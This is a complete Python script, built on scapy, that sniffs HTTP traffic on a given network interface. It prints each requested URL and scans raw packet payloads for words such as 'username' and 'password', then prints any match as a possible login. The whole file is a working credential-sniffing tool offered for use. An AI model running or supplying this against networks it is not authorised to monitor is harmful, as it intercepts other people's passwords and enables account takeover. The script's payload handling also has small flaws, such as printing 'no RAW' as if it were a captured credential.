#!/usr/bin/env python

import scapy.all as scapy
from scapy.layers import http
import argparse

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", dest="interface", help="interface to sniff on")
    options = parser.parse_args()
    if not options.interface:
        parser.error("[-] Please specify interface, use --help for more info")
    return options

def sniff(interface):
    print("[+] Starting sniffing process on " + interface)
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login(packet):
    if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            keywords = ["username", "user", "login", "password", "pass"]
            for keyword in keywords:
                if keyword in load:
                    return load
    else:
        return "no RAW"



def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP-Request " + url)

        login = get_login(packet)
        if login:
            print("\n\n[+] Possible usernames/passwords >> " + login + "\n\n")

options = get_arguments()
sniff(options.interface)